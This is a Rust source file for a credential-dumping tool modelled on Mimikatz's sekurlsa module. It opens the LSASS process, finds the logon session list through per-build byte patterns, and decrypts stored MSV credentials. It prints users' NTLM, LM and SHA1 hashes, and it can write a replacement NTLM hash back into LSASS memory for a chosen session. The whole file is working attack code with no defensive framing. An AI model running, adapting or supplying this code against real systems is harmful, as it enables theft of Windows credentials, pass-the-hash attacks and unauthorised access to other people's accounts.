use crate::binding;
use crate::error::{LsaError, LsaResult};
use crate::msv;
use binding::Windows::Win32::Debug::{ReadProcessMemory, WriteProcessMemory};
use binding::Windows::Win32::Kernel::{LIST_ENTRY, LUID};
use binding::Windows::Win32::Security::{ConvertSidToStringSidA, PSID, SID, UNICODE_STRING};
use binding::Windows::Win32::SystemServices::{
    LocalFree, NtQueryInformationProcess, OpenProcess, HANDLE, PEB, PEB_LDR_DATA,
    PROCESS_ACCESS_RIGHTS,
};
use binding::Windows::Win32::WindowsProgramming::{
    LDR_DATA_TABLE_ENTRY, PROCESSINFOCLASS, PROCESS_BASIC_INFORMATION,
};
use hex::ToHex;
use std::ffi::CString;
use std::mem;
use std::ptr;
use sysinfo::{ProcessExt, System, SystemExt};

extern "system" {
    fn RtlGetNtVersionNumbers(pMajor: *const u32, pMinor: *const u32, pBuild: *const u32);
}

#[derive(Debug)]
pub struct OsVersion {
    pub major_version: u32,
    pub minor_version: u32,
    pub build_number: u32,
}

#[derive(Debug)]
pub struct ModInfo {
    pub dll_base: isize,
    pub size_of_image: u32,
    pub time_date_stamp: u32,
    pub mem: Vec<u8>,
}

#[derive(Debug)]
pub struct Lsa {
    pub pid: u32,
    pub handle: HANDLE,
    pub os_version: OsVersion,
    pub mod_info: ModInfo,
}

impl Lsa {
    pub fn new() -> LsaResult<Lsa> {
        unsafe {
            let mut lsa: Lsa = Lsa {
                pid: 0,
                handle: HANDLE::NULL,
                os_version: mem::zeroed(),
                mod_info: ModInfo {
                    dll_base: 0,
                    size_of_image: 0,
                    time_date_stamp: 0,
                    mem: Vec::new(),
                },
            };
            lsa.pid = get_process_id_by_name("lsass.exe").unwrap_or(0);
            if lsa.pid == 0 {
                return Err(LsaError::new("LSASS process was not found"));
            }

            RtlGetNtVersionNumbers(
                &lsa.os_version.major_version as _,
                &lsa.os_version.minor_version as _,
                &lsa.os_version.build_number as _,
            );
            lsa.os_version.build_number &= 0x00007fff;

            let handle = OpenProcess(
                PROCESS_ACCESS_RIGHTS::PROCESS_VM_READ
                    | PROCESS_ACCESS_RIGHTS::PROCESS_VM_OPERATION
                    | PROCESS_ACCESS_RIGHTS::PROCESS_VM_WRITE
                    | if lsa.os_version.major_version < 6 {
                        PROCESS_ACCESS_RIGHTS::PROCESS_QUERY_INFORMATION
                    } else {
                        PROCESS_ACCESS_RIGHTS::PROCESS_QUERY_LIMITED_INFORMATION
                    },
                false,
                lsa.pid as _,
            );
            if handle.is_invalid() || handle.is_null() {
                return Err(LsaError::new("OpenProcess error"));
            }

            lsa.handle = handle;
            lsa.get_mod_info_from_lsass("lsasrv.dll")?;

            crate::lsa_crypt::nt6_acquire_keys(&lsa)?;

            return Ok(lsa);
        }
    }

    pub fn get_mod_info_from_lsass(&mut self, mod_name: &str) -> LsaResult<()> {
        unsafe {
            let pbi: PROCESS_BASIC_INFORMATION = mem::zeroed();
            let size: u32 = 0;
            NtQueryInformationProcess(
                self.handle,
                PROCESSINFOCLASS::ProcessBasicInformation,
                &pbi as *const PROCESS_BASIC_INFORMATION as _,
                mem::size_of::<PROCESS_BASIC_INFORMATION>() as _,
                &size as *const u32 as _,
            );

            let peb: PEB = mem::zeroed();
            read_process_mem(
                self.handle,
                pbi.PebBaseAddress as *const u8 as _,
                &peb as *const PEB as _,
                mem::size_of::<PEB>(),
            )?;

            let ldr_data: PEB_LDR_DATA = mem::zeroed();
            read_process_mem(
                self.handle,
                peb.Ldr as _,
                &ldr_data as *const PEB_LDR_DATA as _,
                mem::size_of::<PEB_LDR_DATA>(),
            )?;

            let base = ldr_data.InMemoryOrderModuleList.Flink as *const LDR_DATA_TABLE_ENTRY;
            let mut next = base;

            loop {
                let ldr_entry: LDR_DATA_TABLE_ENTRY = mem::zeroed();
                read_process_mem(
                    self.handle,
                    next as _,
                    ((&ldr_entry as *const LDR_DATA_TABLE_ENTRY) as *const u8)
                        .offset(mem::size_of::<LIST_ENTRY>() as isize) as _,
                    mem::size_of::<LDR_DATA_TABLE_ENTRY>(),
                )?;
                if ldr_entry.FullDllName.Buffer.0 == 0 as _ || ldr_entry.FullDllName.Length == 0 {
                    break;
                }

                let base_dll_name =
                    &*(&ldr_entry.Reserved4[0] as *const u8 as *const UNICODE_STRING);

                let unicode_string = read_unicode_string(self.handle, base_dll_name)
                    .ok_or(LsaError::new("read_unicode_string error"))?;

                if unicode_string.to_ascii_lowercase() == mod_name.to_ascii_lowercase() {
                    let mem = vec![0_u8; (ldr_entry.Reserved3[1] as u32 & 0xffffffff) as _];

                    read_process_mem(
                        self.handle,
                        ldr_entry.DllBase as _,
                        &mem[0] as *const u8 as _,
                        (ldr_entry.Reserved3[1] as u32 & 0xffffffff) as _,
                    )?;

                    self.mod_info = ModInfo {
                        dll_base: ldr_entry.DllBase as _,
                        size_of_image: ldr_entry.Reserved3[1] as u32 & 0xffffffff,
                        time_date_stamp: ldr_entry.TimeDateStamp,
                        mem: mem,
                    };

                    println!(
                        "Found LSASRV.dll @ {:?}, size: 0x{:x}",
                        ldr_entry.DllBase,
                        ldr_entry.Reserved3[1] as u32 & 0xffffffff
                    );
                    return Ok(());
                }

                let new: isize = 0;
                read_process_mem(
                    self.handle,
                    next as _,
                    &new as *const isize as _,
                    mem::size_of::<isize>(),
                )?;

                next = new as _;
                if next == base {
                    break;
                }
            }
        }
        Err(LsaError::new("Couldn't find mod LSASRV"))
    }

    pub fn handle_logon_session_lst(
        &self,
        display_msv: bool,
        patch_data: &Option<crate::PatchData>,
    ) -> LsaResult<()> {
        let ptrn = get_ptrn_from_build_number(self.os_version.build_number)
            .ok_or(LsaError::new("No matched LogonSessionList pattern found"))?;

        let ptrn_offset = self
            .mod_info
            .mem
            .windows(ptrn.1.len())
            .position(|window| window == ptrn.1)
            .ok_or(LsaError::new(
                "Couldn't find the signature of LoginSessionList in memory",
            ))?;

        unsafe {
            let ptr_logon_session_lst_cnt: isize;
            let ptr_logon_session_lst: isize;

            #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
            {
                let offset = 0_i32;
                read_process_mem(
                    self.handle,
                    (self.mod_info.dll_base + ptrn_offset as isize + ptrn.2 .1) as _,
                    &offset as *const i32 as _,
                    mem::size_of::<i32>(),
                )?;

                ptr_logon_session_lst_cnt = self.mod_info.dll_base
                    + ptrn_offset as isize
                    + ptrn.2 .1
                    + mem::size_of::<i32>() as isize
                    + offset as isize;

                let offset = 0_i32;
                read_process_mem(
                    self.handle,
                    (self.mod_info.dll_base + ptrn_offset as isize + ptrn.2 .0) as _,
                    &offset as *const i32 as _,
                    mem::size_of::<i32>(),
                )?;

                ptr_logon_session_lst = self.mod_info.dll_base
                    + ptrn_offset as isize
                    + ptrn.2 .0
                    + mem::size_of::<i32>() as isize
                    + offset as isize;
            }

            #[cfg(all(target_os = "windows", target_arch = "x86"))]
            {
                read_process_mem(
                    self.handle,
                    (mod_info.dll_base + ptrn_offset as isize + ptrn.2 .1) as _,
                    &ptr_logon_session_lst_cnt as *const isize as _,
                    mem::size_of::<isize>(),
                )?;

                read_process_mem(
                    self.handle,
                    (mod_info.dll_base + ptrn_offset as isize + ptrn.2 .0) as _,
                    &ptr_logon_session_lst as *const isize as _,
                    mem::size_of::<isize>(),
                )?;
            }

            let logon_session_lst_cnt = 0_u32;
            read_process_mem(
                self.handle,
                ptr_logon_session_lst_cnt as _,
                &logon_session_lst_cnt as *const u32 as _,
                mem::size_of::<u32>(),
            )?;

            println!(
                "Found LogonSessionListCount @ 0x{:x}, value: {}",
                ptr_logon_session_lst_cnt, logon_session_lst_cnt
            );

            let logon_session_lst: *const *const LIST_ENTRY = 0 as _;
            read_process_mem(
                self.handle,
                ptr_logon_session_lst as _,
                &logon_session_lst as *const *const *const LIST_ENTRY as _,
                mem::size_of::<*const *const LIST_ENTRY>(),
            )?;

            println!("Found LogonSessionList @ 0x{:x}", ptr_logon_session_lst);

            let helper = if self.os_version.build_number < WIN_MIN_BUILD_2K3 {
                crate::msv::select_msv_lst_helper(0)
            } else if self.os_version.build_number < WIN_MIN_BUILD_VISTA {
                crate::msv::select_msv_lst_helper(1)
            } else if self.os_version.build_number < WIN_MIN_BUILD_7 {
                crate::msv::select_msv_lst_helper(2)
            } else if self.os_version.build_number < WIN_MIN_BUILD_8 {
                crate::msv::select_msv_lst_helper(3)
            } else if self.os_version.build_number < WIN_MIN_BUILD_BLUE {
                crate::msv::select_msv_lst_helper(5)
            } else {
                crate::msv::select_msv_lst_helper(6)
            };

            let session_lst = enum_logon_session_lst(
                helper,
                self.handle,
                logon_session_lst_cnt,
                logon_session_lst,
            )?;

            println!("Found {} logon sessions", session_lst.len());

            let helper = if self.os_version.build_number >= WIN_BUILD_10_1607 {
                msv::select_primary_helper(3)
            } else if self.os_version.build_number >= WIN_BUILD_10_1511 {
                msv::select_primary_helper(2)
            } else if self.os_version.build_number >= WIN_BUILD_10_1507 {
                msv::select_primary_helper(1)
            } else {
                msv::select_primary_helper(0)
            };

            let _: Vec<_> = session_lst
                .iter()
                .map(|s| {
                    let _ = iter_logon_session(self, &s, helper, display_msv, patch_data);
                })
                .collect();
        }

        Ok(())
    }
}

const NULL_STR: &str = "<NULL>";

#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
mod PTRN {
    use super::*;

    pub(crate) const PTRN_WIN5_LogonSessionList: &[u8] = &[
        0x4c, 0x8b, 0xdf, 0x49, 0xc1, 0xe3, 0x04, 0x48, 0x8b, 0xcb, 0x4c, 0x03, 0xd8,
    ];
    pub(crate) const PTRN_WN60_LogonSessionList: &[u8] = &[
        0x33, 0xff, 0x45, 0x85, 0xc0, 0x41, 0x89, 0x75, 0x00, 0x4c, 0x8b, 0xe3, 0x0f, 0x84,
    ];
    pub(crate) const PTRN_WN61_LogonSessionList: &[u8] = &[
        0x33, 0xf6, 0x45, 0x89, 0x2f, 0x4c, 0x8b, 0xf3, 0x85, 0xff, 0x0f, 0x84,
    ];
    pub(crate) const PTRN_WN63_LogonSessionList: &[u8] = &[
        0x8b, 0xde, 0x48, 0x8d, 0x0c, 0x5b, 0x48, 0xc1, 0xe1, 0x05, 0x48, 0x8d, 0x05,
    ];
    pub(crate) const PTRN_WN6x_LogonSessionList: &[u8] = &[
        0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74,
    ];
    pub(crate) const PTRN_WN1703_LogonSessionList: &[u8] = &[
        0x33, 0xff, 0x45, 0x89, 0x37, 0x48, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74,
    ];
    pub(crate) const PTRN_WN1803_LogonSessionList: &[u8] = &[
        0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74,
    ];

    pub(crate) const LSA_SRV_REF_BUILD_XP: (u32, &[u8], (isize, isize)) =
        (WIN_BUILD_XP, PTRN_WIN5_LogonSessionList, (-4, 0));
    pub(crate) const LSA_SRV_REF_BUILD_2K3: (u32, &[u8], (isize, isize)) =
        (WIN_BUILD_2K3, PTRN_WIN5_LogonSessionList, (-4, -45));
    pub(crate) const LSA_SRV_REF_BUILD_VISTA: (u32, &[u8], (isize, isize)) =
        (WIN_BUILD_VISTA, PTRN_WN60_LogonSessionList, (21, -4));
    pub(crate) const LSA_SRV_REF_BUILD_7: (u32, &[u8], (isize, isize)) =
        (WIN_BUILD_7, PTRN_WN61_LogonSessionList, (19, -4));
    pub(crate) const LSA_SRV_REF_BUILD_8: (u32, &[u8], (isize, isize)) =
        (WIN_BUILD_8, PTRN_WN6x_LogonSessionList, (16, -4));
    pub(crate) const LSA_SRV_REF_BUILD_BLUE: (u32, &[u8], (isize, isize)) =
        (WIN_BUILD_BLUE, PTRN_WN63_LogonSessionList, (36, -6));
    pub(crate) const LSA_SRV_REF_BUILD_10_1507: (u32, &[u8], (isize, isize)) =
        (WIN_BUILD_10_1507, PTRN_WN6x_LogonSessionList, (16, -4));
    pub(crate) const LSA_SRV_REF_BUILD_10_1703: (u32, &[u8], (isize, isize)) =
        (WIN_BUILD_10_1703, PTRN_WN1703_LogonSessionList, (23, -4));
    pub(crate) const LSA_SRV_REF_BUILD_10_1803: (u32, &[u8], (isize, isize)) =
        (WIN_BUILD_10_1803, PTRN_WN1803_LogonSessionList, (23, -4));
    pub(crate) const LSA_SRV_REF_BUILD_10_1903: (u32, &[u8], (isize, isize)) =
        (WIN_BUILD_10_1903, PTRN_WN6x_LogonSessionList, (23, -4));

    pub(crate) const LSA_SRV_REF: [(u32, &[u8], (isize, isize)); 10] = [
        LSA_SRV_REF_BUILD_XP,
        LSA_SRV_REF_BUILD_2K3,
        LSA_SRV_REF_BUILD_VISTA,
        LSA_SRV_REF_BUILD_7,
        LSA_SRV_REF_BUILD_8,
        LSA_SRV_REF_BUILD_BLUE,
        LSA_SRV_REF_BUILD_10_1507,
        LSA_SRV_REF_BUILD_10_1703,
        LSA_SRV_REF_BUILD_10_1803,
        LSA_SRV_REF_BUILD_10_1903,
    ];
}

#[cfg(all(target_os = "windows", target_arch = "x86"))]
mod PTRN {
    use super::*;

    pub(crate) const PTRN_WN51_LogonSessionList: &[u8] =
        &[0xff, 0x50, 0x10, 0x85, 0xc0, 0x0f, 0x84];
    pub(crate) const PTRN_WNO8_LogonSessionList: &[u8] =
        &[0x89, 0x71, 0x04, 0x89, 0x30, 0x8d, 0x04, 0xbd];
    pub(crate) const PTRN_WN80_LogonSessionList: &[u8] = &[
        0x8b, 0x45, 0xf8, 0x8b, 0x55, 0x08, 0x8b, 0xde, 0x89, 0x02, 0x89, 0x5d, 0xf0, 0x85, 0xc9,
        0x74,
    ];
    pub(crate) const PTRN_WN81_LogonSessionList: &[u8] = &[
        0x8b, 0x4d, 0xe4, 0x8b, 0x45, 0xf4, 0x89, 0x75, 0xe8, 0x89, 0x01, 0x85, 0xff, 0x74,
    ];
    pub(crate) const PTRN_WN6x_LogonSessionList: &[u8] = &[
        0x8b, 0x4d, 0xe8, 0x8b, 0x45, 0xf4, 0x89, 0x75, 0xec, 0x89, 0x01, 0x85, 0xff, 0x74,
    ];

    pub(crate) const LSA_SRV_REF_BUILD_XP: (u32, &[u8], (isize, isize)) =
        (WIN_BUILD_XP, PTRN_WN51_LogonSessionList, (24, 0));
    pub(crate) const LSA_SRV_REF_BUILD_2K3: (u32, &[u8], (isize, isize)) =
        (WIN_BUILD_2K3, PTRN_WNO8_LogonSessionList, (-11, -43));
    pub(crate) const LSA_SRV_REF_BUILD_VISTA: (u32, &[u8], (isize, isize)) =
        (WIN_BUILD_VISTA, PTRN_WNO8_LogonSessionList, (-11, -42));
    pub(crate) const LSA_SRV_REF_BUILD_8: (u32, &[u8], (isize, isize)) =
        (WIN_BUILD_8, PTRN_WN80_LogonSessionList, (18, -4));
    pub(crate) const LSA_SRV_REF_BUILD_BLUE: (u32, &[u8], (isize, isize)) =
        (WIN_BUILD_BLUE, PTRN_WN81_LogonSessionList, (16, -4));
    pub(crate) const LSA_SRV_REF_BUILD_10_1507: (u32, &[u8], (isize, isize)) =
        (WIN_BUILD_10_1507, PTRN_WN6x_LogonSessionList, (16, -4));

    pub(crate) const LSA_SRV_REF: [(u32, &[u8], (isize, isize)); 6] = [
        LSA_SRV_REF_BUILD_XP,
        LSA_SRV_REF_BUILD_2K3,
        LSA_SRV_REF_BUILD_VISTA,
        LSA_SRV_REF_BUILD_8,
        LSA_SRV_REF_BUILD_BLUE,
        LSA_SRV_REF_BUILD_10_1507,
    ];
}

pub(crate) const WIN_BUILD_XP: u32 = 2600;
pub(crate) const WIN_BUILD_2K3: u32 = 3790;
pub(crate) const WIN_BUILD_VISTA: u32 = 6000;
pub(crate) const WIN_BUILD_7: u32 = 7600;
pub(crate) const WIN_BUILD_8: u32 = 9200;
pub(crate) const WIN_BUILD_BLUE: u32 = 9600;
pub(crate) const WIN_BUILD_10_1507: u32 = 10240;
pub(crate) const WIN_BUILD_10_1511: u32 = 10586;
pub(crate) const WIN_BUILD_10_1607: u32 = 14393;
pub(crate) const WIN_BUILD_10_1703: u32 = 15063;
pub(crate) const WIN_BUILD_10_1709: u32 = 16299;
pub(crate) const WIN_BUILD_10_1803: u32 = 17134;
pub(crate) const WIN_BUILD_10_1809: u32 = 17763;
pub(crate) const WIN_BUILD_10_1903: u32 = 18362;
pub(crate) const WIN_BUILD_10_1909: u32 = 18363;
pub(crate) const WIN_BUILD_10_2004: u32 = 19041;

pub(crate) const WIN_MIN_BUILD_XP: u32 = 2500;
pub(crate) const WIN_MIN_BUILD_2K3: u32 = 3000;
pub(crate) const WIN_MIN_BUILD_VISTA: u32 = 5000;
pub(crate) const WIN_MIN_BUILD_7: u32 = 7000;
pub(crate) const WIN_MIN_BUILD_8: u32 = 8000;
pub(crate) const WIN_MIN_BUILD_BLUE: u32 = 9400;
pub(crate) const WIN_MIN_BUILD_10: u32 = 9800;

fn get_ptrn_from_build_number(build: u32) -> Option<(u32, &'static [u8], (isize, isize))> {
    let mut ret = None;
    for r in PTRN::LSA_SRV_REF.iter() {
        if r.0 <= build {
            ret = Some(*r);
        } else {
            break;
        }
    }
    ret
}

pub(crate) fn get_process_id_by_name(name: &str) -> Option<u32> {
    let mut s = System::new();
    s.refresh_processes();
    let p = *s.get_process_by_name(name).get(0)?;
    Some(p.pid() as _)
}

fn read_unicode_string(handle: HANDLE, unicode_string: &UNICODE_STRING) -> Option<String> {
    if unicode_string.Length == 0 {
        return Some(String::from(NULL_STR));
    }

    let unicode_string_buf = vec![0_u16; unicode_string.Length as usize / 2];
    unsafe {
        read_process_mem(
            handle,
            unicode_string.Buffer.0 as _,
            &unicode_string_buf[0] as *const u16 as _,
            unicode_string.Length as _,
        )
        .ok()?;
    }

    String::from_utf16(&unicode_string_buf).ok()
}

pub(crate) unsafe fn read_process_mem(
    handle: HANDLE,
    base_addr: *const u8,
    buffer: *const u8,
    size: usize,
) -> LsaResult<()> {
    let ret = ReadProcessMemory(handle, base_addr as _, buffer as _, size, 0 as _);
    if ret.as_bool() {
        Ok(())
    } else {
        Err(LsaError::new("ReadProcessMemory error"))
    }
}

#[derive(Debug, Clone, Copy)]
struct SecurityLogonSessionData {
    logon_id: LUID,
    username: UNICODE_STRING,
    logon_domain: UNICODE_STRING,
    logon_typ: u32,
    session: u32,
    credentials: *const (),
    sid: *const SID,
    credential_mgr: *const (),
    logon_time: i64,
    logon_server: UNICODE_STRING,
}

fn filetime_to_unixtime(filetime: i64) -> String {
    if filetime == 0 {
        return NULL_STR.to_string();
    }

    let t = std::time::UNIX_EPOCH
        + std::time::Duration::from_secs((filetime / 10000000 - 11644473600) as u64);
    chrono::DateTime::<chrono::Local>::from(t)
        .format("%Y-%m-%d %H:%M:%S")
        .to_string()
}

fn logon_typ_to_str(typ: u32) -> &'static str {
    match typ {
        1 => "Interactive",
        2 => "Network",
        3 => "Batch",
        4 => "Service",
        5 => "Unlock",
        6 => "NetworkClearText",
        7 => "NewCredentials",
        8 => "RemoteInteractive",
        9 => "CachedInteractive",
        _ => "Undefined",
    }
}

unsafe fn iter_logon_session(
    lsa: &Lsa,
    session_data: &SecurityLogonSessionData,
    helper: msv::PrimaryHelper,
    display_msv: bool,
    patch_data: &Option<crate::PatchData>,
) -> LsaResult<()> {
    if display_msv {
        let username = read_unicode_string(lsa.handle, &session_data.username)
            .ok_or(LsaError::new("read_unicode_string error"))?;
        let logon_domain = read_unicode_string(lsa.handle, &session_data.logon_domain)
            .ok_or(LsaError::new("read_unicode_string error"))?;
        let logon_server = read_unicode_string(lsa.handle, &session_data.logon_server)
            .ok_or(LsaError::new("read_unicode_string error"))?;

        let sid_str = if session_data.sid != 0 as _ {
            let sid: SID = mem::zeroed();
            read_process_mem(
                lsa.handle,
                session_data.sid as _,
                &sid as *const SID as _,
                mem::size_of::<SID>(),
            )?;

            let sid_sz = 0_isize;
            ConvertSidToStringSidA(PSID(&sid as *const SID as _), &sid_sz as *const isize as _);
            let tmp = String::from(
                CString::from_raw(sid_sz as *const i8 as _)
                    .to_owned()
                    .to_str()
                    .unwrap_or(NULL_STR),
            );
            // LocalFree(sid_sz as _);
            tmp
        } else {
            String::from(NULL_STR)
        };

        println!(
            r#"
=======================================
Authentication Id: {}:{}
Session          : {} 
Logon Type       : {} ({})
Username         : {}
Domain           : {}
Logon Server     : {}
Logon Time       : {}
SID              : {}"#,
            session_data.logon_id.HighPart,
            session_data.logon_id.LowPart,
            session_data.session,
            session_data.logon_typ,
            logon_typ_to_str(session_data.logon_typ),
            username,
            logon_domain,
            logon_server,
            filetime_to_unixtime(session_data.logon_time),
            sid_str,
        );
    }

    if session_data.credentials != 0 as _ {
        let msv_credentials: msv::KIWI_MSV1_0_CREDENTIALS = mem::zeroed();
        read_process_mem(
            lsa.handle,
            session_data.credentials as _,
            &msv_credentials as *const msv::KIWI_MSV1_0_CREDENTIALS as _,
            mem::size_of::<msv::KIWI_MSV1_0_CREDENTIALS>(),
        )?;

        let msv_primary_credentials: msv::KIWI_MSV1_0_PRIMARY_CREDENTIALS = mem::zeroed();
        read_process_mem(
            lsa.handle,
            msv_credentials.PrimaryCredentials as _,
            &msv_primary_credentials as *const msv::KIWI_MSV1_0_PRIMARY_CREDENTIALS as _,
            mem::size_of::<msv::KIWI_MSV1_0_PRIMARY_CREDENTIALS>(),
        )?;

        let buf = vec![0_u8; msv_primary_credentials.Primary.Length as _];
        read_process_mem(
            lsa.handle,
            msv_primary_credentials.Primary.Buffer as _,
            &buf[0] as *const u8 as _,
            msv_primary_credentials.Primary.Length as _,
        )?;

        if String::from_utf8(buf).unwrap_or(String::new()) == "Primary" {
            let mut credentials = vec![0_u8; msv_primary_credentials.Credentials.Length as _];
            read_process_mem(
                lsa.handle,
                msv_primary_credentials.Credentials.Buffer.0 as _,
                &credentials[0] as *const u8 as _,
                msv_primary_credentials.Credentials.Length as _,
            )?;

            /*
            println!(
                "Found encrypted credentials @ {:?}, length: {}",
                msv_primary_credentials.Credentials.Buffer.0,
                credentials.len(),
            );
            */
            crate::lsa_crypt::nt6_encrypt_mem(&credentials, false)?;
            // println!("Decrypt ok");

            if display_msv {
                let nt_hsh = &credentials[helper.offsetToNtOwfPassword
                    ..helper.offsetToNtOwfPassword + msv::LM_NTLM_HASH_LENGTH];
                let is_nt_hsh = credentials[helper.offsetToisNtOwfPassword];

                let lm_hsh = &credentials[helper.offsetToLmOwfPassword
                    ..helper.offsetToLmOwfPassword + msv::LM_NTLM_HASH_LENGTH];
                let is_lm_hsh = credentials[helper.offsetToisLmOwfPassword];

                let sha_dgt = &credentials[helper.offsetToShaOwPassword
                    ..helper.offsetToShaOwPassword + msv::SHA_DIGEST_LENGTH];
                let is_sha_dgt = credentials[helper.offsetToisShaOwPassword];

                let username_u =
                    &*(&credentials[helper.offsetToUserName] as *const u8 as *const UNICODE_STRING);
                let username = String::from_utf16(
                    &*(ptr::slice_from_raw_parts(
                        &credentials[username_u.Buffer.0 as usize] as *const u8 as *const u16,
                        (username_u.Length / 2) as usize,
                    )),
                )
                .unwrap_or(String::from(NULL_STR));

                let domain_u = &*(&credentials[helper.offsetToLogonDomain] as *const u8
                    as *const UNICODE_STRING);
                let domain = String::from_utf16(
                    &*(ptr::slice_from_raw_parts(
                        &credentials[domain_u.Buffer.0 as usize] as *const u8 as *const u16,
                        (domain_u.Length / 2) as usize,
                    )),
                )
                .unwrap_or(String::from(NULL_STR));

                println!(
                    r#"
        msv: 
            Username: {}
            Domain  : {}
            NTLM    : {} {}
            LM      : {} {}
            SHA1    : {} {}"#,
                    username,
                    domain,
                    nt_hsh.encode_hex::<String>(),
                    if is_nt_hsh != 0 { "*" } else { "" },
                    lm_hsh.encode_hex::<String>(),
                    if is_lm_hsh != 0 { "*" } else { "" },
                    sha_dgt.encode_hex::<String>(),
                    if is_sha_dgt != 0 { "*" } else { "" },
                );
            }

            match patch_data {
                Some(patch_data) => {
                    if session_data.logon_id == patch_data.luid {
                        credentials[helper.offsetToisLmOwfPassword] = 0;
                        credentials[helper.offsetToisShaOwPassword] = 0;
                        if helper.offsetToisIso != 0 {
                            credentials[helper.offsetToisIso] = 0;
                        }

                        if helper.offsetToisDPAPIProtected != 0 {
                            credentials[helper.offsetToisDPAPIProtected] = 0;
                            ptr::write_bytes(
                                &credentials[helper.offsetToDPAPIProtected] as *const u8 as *mut u8,
                                0,
                                msv::LM_NTLM_HASH_LENGTH,
                            );
                        }

                        ptr::write_bytes(
                            &credentials[helper.offsetToLmOwfPassword] as *const u8 as *mut u8,
                            0,
                            msv::LM_NTLM_HASH_LENGTH,
                        );

                        ptr::write_bytes(
                            &credentials[helper.offsetToShaOwPassword] as *const u8 as *mut u8,
                            0,
                            msv::SHA_DIGEST_LENGTH,
                        );

                        credentials[helper.offsetToNtOwfPassword] = 1;
                        ptr::copy_nonoverlapping(
                            patch_data.ntlm.as_ptr(),
                            &credentials[helper.offsetToNtOwfPassword] as *const u8 as _,
                            msv::LM_NTLM_HASH_LENGTH,
                        );

                        crate::lsa_crypt::nt6_encrypt_mem(&credentials, true)?;
                        if !WriteProcessMemory(
                            lsa.handle,
                            msv_primary_credentials.Credentials.Buffer.0 as _,
                            &credentials[0] as *const u8 as _,
                            credentials.len(),
                            0 as _,
                        )
                        .as_bool()
                        {
                            return Err(LsaError::new("WriteProcessMemory error"));
                        }

                        println!(
                            "Replace NTLM hash @ 0x{:x}",
                            msv_primary_credentials.Credentials.Buffer.0 as isize
                                + helper.offsetToNtOwfPassword as isize
                        );
                    }
                }
                None => (),
            }
        }
    }

    Ok(())
}

unsafe fn enum_logon_session_lst(
    helper: crate::msv::MsvLstHelper,
    handle: HANDLE,
    logon_session_lst_cnt: u32,
    logon_session_lst: *const *const LIST_ENTRY,
) -> LsaResult<Vec<SecurityLogonSessionData>> {
    let mut ret = vec![];

    for i in 0..logon_session_lst_cnt {
        let mut ptr: *const LIST_ENTRY = 0 as _;
        read_process_mem(
            handle,
            logon_session_lst.offset(i as isize) as _,
            &ptr as *const *const LIST_ENTRY as _,
            mem::size_of::<*const LIST_ENTRY>(),
        )?;

        let entry: LIST_ENTRY = mem::zeroed();
        read_process_mem(
            handle,
            ptr as _,
            &entry as *const LIST_ENTRY as _,
            mem::size_of::<*const LIST_ENTRY>(),
        )?;

        let head = ptr;

        while entry.Flink != head as _ {
            ptr = entry.Flink as _;
            read_process_mem(
                handle,
                entry.Flink as _,
                &entry as *const LIST_ENTRY as _,
                mem::size_of::<*const LIST_ENTRY>(),
            )?;

            let buffer = vec![0_u8; helper.size];
            read_process_mem(handle, ptr as _, &buffer[0] as *const u8, helper.size)?;

            let logon_id = *(&buffer[helper.offsetToLuid] as *const u8 as *const LUID);
            let username =
                *(&buffer[helper.offsetToUsername] as *const u8 as *const UNICODE_STRING);
            let logon_domain =
                *(&buffer[helper.offsetToDomain] as *const u8 as *const UNICODE_STRING);
            let logon_typ = *(&buffer[helper.offsetToLogonType] as *const u8 as *const u32);
            let session = *(&buffer[helper.offsetToSession] as *const u8 as *const u32);
            let credentials =
                *(&buffer[helper.offsetToCredentials] as *const u8 as *const *const ());
            let sid = *(&buffer[helper.offsetToPSid] as *const u8 as *const *const SID);
            let credential_mgr =
                *(&buffer[helper.offsetToCredentialManager] as *const u8 as *const *const ());
            let logon_time = *(&buffer[helper.offsetToLogonTime] as *const u8 as *const i64);
            let logon_server =
                *(&buffer[helper.offsetToLogonServer] as *const u8 as *const UNICODE_STRING);

            let session_data = SecurityLogonSessionData {
                logon_id: logon_id,
                username: username,
                logon_domain: logon_domain,
                logon_typ: logon_typ,
                session: session,
                credentials: credentials,
                sid: sid,
                credential_mgr: credential_mgr,
                logon_time: logon_time,
                logon_server: logon_server,
            };
            ret.push(session_data);
        }
    }

    Ok(ret)
}
